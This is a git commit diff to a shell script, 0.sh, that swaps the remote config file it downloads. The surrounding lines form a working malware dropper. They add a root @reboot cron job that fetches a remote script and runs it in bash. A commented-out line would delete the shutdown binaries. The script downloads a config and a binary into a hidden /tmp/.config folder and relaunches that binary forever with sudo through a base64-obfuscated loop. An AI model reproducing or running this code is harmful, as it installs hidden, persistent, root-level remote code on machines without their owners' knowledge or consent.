ef22571e17a7094950d6844627b3436c80ca9efd
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-03-17 06:41:30 +0800

    Update 0.sh

--- 0.sh
+++ 0.sh
@@ -5,7 +5,7 @@ sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubuserconten
 ###sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 
 mkdir -p /tmp/.config
-wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/9v.json
+wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/10v.json
 wget -qO /tmp/.config/bash https://raw.githubusercontent.com/Blenkinship/any/main/0
 chmod -R 777 /tmp/.config
 /bin/sh -c "echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIHN1ZG8gLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmUK' |base64 -d |/bin/bash" &
